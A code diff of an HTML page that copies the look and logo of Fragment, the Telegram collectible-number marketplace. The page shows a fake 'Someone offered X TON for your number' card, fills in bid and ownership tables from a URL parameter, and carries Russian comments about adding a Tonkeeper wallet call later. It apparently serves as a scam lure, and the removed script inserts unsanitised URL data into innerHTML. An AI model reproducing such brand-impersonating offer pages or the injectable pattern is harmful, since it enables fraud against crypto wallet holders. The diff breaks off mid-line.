@@ -6,21 +6,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        :root {
-            --bg: #121519;
-            --card: #1f242b;
-            --text: #fff;
-            --accent-blue: #00a2ff;
-            --green: #22c55e;
-        }
+        :root { --bg:#121519; --card:#1f242b; --accent:#00a2ff; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Roboto', system-ui, sans-serif;
             background: var(--bg);
-            color: var(--text);
+            color: #fff;
             line-height: 1.4;
-            padding-bottom: 80px;
-            min-height: 100vh;
+            padding-bottom: 60px;
         }
         header {
             background: #1a1e24;
@@ -31,54 +24,67 @@
             border-bottom: 1px solid #2a2f38;
             position: sticky;
             top: 0;
-            z-index: 10;
+            z-index: 100;
         }
-        .logo { font-size: 22px; font-weight: 700; letter-spacing: -1px; }
-        .search {
+        .logo-svg { width: 110px; }
+        .search-container {
             flex: 1;
+            position: relative;
+        }
+        .search-container svg {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+        }
+        .search {
+            width: 100%;
             background: #2a2f38;
-            border-radius: 9999px;
-            padding: 8px 16px;
-            color: #aaa;
-            font-size: 15px;
             border: none;
-            outline: none;
+            border-radius: 9999px;
+            padding: 10px 16px 10px 44px;
+            color: #fff;
+            font-size: 15px;
         }
         .connect-btn {
-            background: #00a2ff;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 9999px;
-            font-weight: 600;
-            font-size: 14px;
             display: flex;
             align-items: center;
             gap: 6px;
+            background: #272c34;
+            color: #fff;
+            border: none;
+            border-radius: 9999px;
+            padding: 8px 16px;
+            font-weight: 600;
+            font-size: 14px;
+            white-space: nowrap;
         }
+        .connect-ton { background: #00a2ff; color: #121519; }
         .number-block {
             text-align: center;
-            padding: 20px 16px 12px;
+            padding: 24px 16px 16px;
         }
         .number {
             font-size: 28px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
-        .claimed {
-            background: var(--green);
+        .status-badge {
+            background: #22c55e;
             color: #121519;
             font-size: 13px;
             font-weight: 700;
-            padding: 2px 12px;
+            padding: 2px 14px;
             border-radius: 9999px;
             display: inline-block;
         }
         .subscribe {
-            text-align: center;
+            text-align: right;
+            padding: 0 16px 12px;
             color: #00a2ff;
             font-size: 15px;
-            margin-bottom: 20px;
         }
         .content {
             padding: 0 16px;
@@ -88,12 +94,11 @@
         }
         .card {
             flex: 1;
-            min-width: 300px;
+            min-width: 280px;
             background: var(--card);
             border-radius: 12px;
             padding: 20px;
         }
-        .card h3 { font-size: 17px; margin-bottom: 12px; }
         .offer-text { font-size: 15px; line-height: 1.5; }
         .accept-btn {
             background: #00a2ff;
@@ -107,15 +112,8 @@
             margin: 24px 16px 32px;
             box-shadow: 0 4px 20px rgba(0,162,255,0.3);
         }
-        .section {
-            margin: 0 16px 32px;
-        }
-        .section-title {
-            font-size: 20px;
-            font-weight: 500;
-            margin-bottom: 12px;
-            padding-left: 4px;
-        }
+        .section { margin: 0 16px 32px; }
+        .section-title { font-size: 20px; font-weight: 500; margin-bottom: 12px; }
         table {
             width: 100%;
             border-collapse: collapse;
@@ -123,168 +121,17 @@
             border-radius: 12px;
             overflow: hidden;
         }
-        th {
-            background: #272c34;
-            padding: 14px 12px;
-            text-align: left;
-            font-weight: 500;
-            font-size: 14px;
-            color: #aaa;
-        }
-        td {
-            padding: 14px 12px;
-            border-top: 1px solid #2a2f38;
-        }
-        .ton-value {
-            font-weight: 700;
-            color: #ffd951;
-        }
-        .ton-icon::before {
-            content: "▼";
-            margin-right: 4px;
-            color: #ffd951;
-        }
-        .wallet {
-            color: #00a2ff;
-            font-size: 14px;
-            word-break: break-all;
-        }
-        .empty {
-            text-align: center;
-            padding: 40px 20px;
-            color: #666;
-            font-style: italic;
-        }
-        @media (max-width: 640px) {
-            .content { flex-direction: column; }
-            .card { min-width: auto; }
-        }
+        th { background: #272c34; padding: 14px 12px; text-align: left; font-weight: 500; font-size: 14px; color: #aaa; }
+        td { padding: 14px 12px; border-top: 1px solid #2a2f38; }
+        .ton-value { font-weight: 700; color: #ffd951; display: flex; align-items: center; gap: 4px; }
+        .wallet { color: #00a2ff; word-break: break-all; }
+        .empty { text-align: center; padding: 40px; color: #666; font-style: italic; }
+        @media (max-width: 640px) { .content { flex-direction: column; } }
     </style>
 </head>
 <body>
     <header>
-        <div class="logo">FRAGMENT</div>
-        <input type="text" class="search" placeholder="Search phone numbers" disabled>
-        <button class="connect-btn">▼ Connect TON</button>
-    </header>
+        <!-- FRAGMENT logo -->
+        <svg class="logo-svg" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill="#fff"><path d="M 126.3 153.6 L 252 209.2 C 255.2 210.7 259.2 210.5 264.2 208.2 L 388 153.5 C 394.6 151.1 390.9 143.7 385.7 144.5 L 129.1 143.4 C 121.9 143.7 119.9 150.9 126.3 153.6 Z M 116.2 182.1 L 234.6 366.1 C 238.3 372.1 247.7 368.7 247.4 363.3 L 247.2 237.1 C 247.1 230 245.3 228.4 240.8 226.5 L 122.4 173.8 C 118.1 171.4 112.3 175.4 116.2 182.1 Z M 267.5 234.8 L 267.8 361.8 C 267.9 370.3 276.4 371.9 281.3 364.7 L 384.2 205.3 L 386.4 201.9 L 388.3 199 L 388.3 198.9 L 399.1 182.3 C 402.4 176.8 397.2 170.5 389.4 174.2 L 272 227.1 C 271.8 227.2 271.6 227.3 271.4 227.4 C 269.9 228.3 268.9 229.2 268.4 230.3 C 267.7 231.5 267.5 233 267.5 234.8 Z" fill-rule="evenodd"/></svg>
 
-    <div class="number-block">
-        <div class="number" id="number-display">+888 0000 0000</div>
-        <span class="claimed">Claimed</span>
-    </div>
-
-    <div class="subscribe">Subscribe to updates</div>
-
-    <div class="content">
-        <!-- What is this? -->
-        <div class="card">
-            <h3>What is this?</h3>
-            <p class="offer-text" id="offer-text">
-                Someone offered <strong id="offer-amount">0</strong> for your <strong id="offer-number"></strong>.<br>
-                If the price suits you, press "Accept the offer".
-            </p>
-            <a href="#" onclick="alert('How does this work? — здесь можно добавить объяснение или ссылку')" style="color:#00a2ff; font-size:14px; display:block; margin-top:12px;">
-                How does this work?
-            </a>
-        </div>
-
-        <!-- Collectible Number -->
-        <div class="card">
-            <h3>Collectible Number</h3>
-            <div style="color:#00a2ff; font-size:17px; margin-bottom:8px;" id="collectible-number"></div>
-            <p style="font-size:14px; opacity:0.9;">
-                This collectible number can be used to create a Telegram account not tied to a SIM card.
-            </p>
-        </div>
-    </div>
-
-    <button class="accept-btn" onclick="acceptOffer()">
-        Accept the offer
-    </button>
-
-    <!-- Bid History -->
-    <div class="section">
-        <div class="section-title">Bid History</div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Price</th>
-                    <th>Date</th>
-                    <th>From</th>
-                </tr>
-            </thead>
-            <tbody id="bid-tbody"></tbody>
-        </table>
-        <div id="bid-empty" class="empty" style="display:none;">No bids yet</div>
-    </div>
-
-    <!-- Ownership History -->
-    <div class="section">
-        <div class="section-title">Ownership History</div>
-        <table>
-            <thead>
-                <tr>
-                    <th>Sale price</th>
-                    <th>Date</th>
-                    <th>Buyer</th>
-                </tr>
-            </thead>
-            <tbody id="ownership-tbody"></tbody>
-        </table>
-        <div id="ownership-empty" class="empty" style="display:none;">No ownership history</div>
-    </div>
-
-    <script>
-        function populateTable(tbodyId, data, isOwnership = false) {
-            const tbody = document.getElementById(tbodyId);
-            const emptyId = isOwnership ? 'ownership-empty' : 'bid-empty';
-            if (!data || data.length === 0) {
-                document.getElementById(emptyId).style.display = 'block';
-                return;
-            }
-            data.forEach(item => {
-                const tr = document.createElement('tr');
-                let priceHTML = '';
-                if (item.price === 'Transferred' || item.price.toLowerCase().includes('transferred')) {
-                    priceHTML = `<td>Transferred</td>`;
-                } else {
-                    priceHTML = `<td><span class="ton-icon"></span><span class="ton-value">${item.price}</span></td>`;
-                }
-                tr.innerHTML = `
-                    ${priceHTML}
-                    <td>${item.date}</td>
-                    <td><span class="wallet">${item.buyer}</span></td>
-                `;
-                tbody.appendChild(tr);
-            });
-        }
-
-        function acceptOffer() {
-            alert('✅ Offer accepted!\n\n(В реальном боте здесь будет вызов Tonkeeper)');
-            // Можно добавить реальную логику Ton Connect позже
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const params = new URLSearchParams(window.location.search);
-            const encoded = params.get('data');
-            if (!encoded) return;
-
-            const json = decodeURIComponent(encoded);
-            const data = JSON.parse(json);
-
-            const num = data.formatted_number || '+888 0000 0000';
-            const amount = Number(data.amount || 0).toLocaleString('en-US');
-
-            // Заполняем шапку
-            document.getElementById('number-display').textContent = num;
-            document.getElementById('collectible-number').textContent = num;
-            document.getElementById('offer-number').textContent = num;
-            document.getElementById('offer-amount').textContent = amount + ' TON';
-
-            // Таблицы
-            populateTable('bid-tbody', data.bid_history || []);
-            populateTable('ownership-tbody', data.history || [], true);
-        });
-    </script>
-</body>
-</html>
+        <div class="search-container
